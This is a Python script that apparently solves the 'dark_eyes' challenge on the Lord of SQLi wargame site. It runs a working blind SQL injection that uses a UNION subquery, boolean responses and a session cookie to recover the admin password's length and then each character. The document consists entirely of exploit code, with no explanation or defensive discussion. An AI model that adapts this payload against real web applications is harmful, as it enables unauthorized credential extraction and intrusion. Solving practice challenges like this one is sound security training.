import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?\
            pw=1234' or id='admin' and (SELECT 1 UNION SELECT length(pw)=%d)%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if not (res.text == ""):
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?\
            pw=1234' or id='admin' and (SELECT 1 UNION SELECT ascii(substr(pw,%d,1))=%d)%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break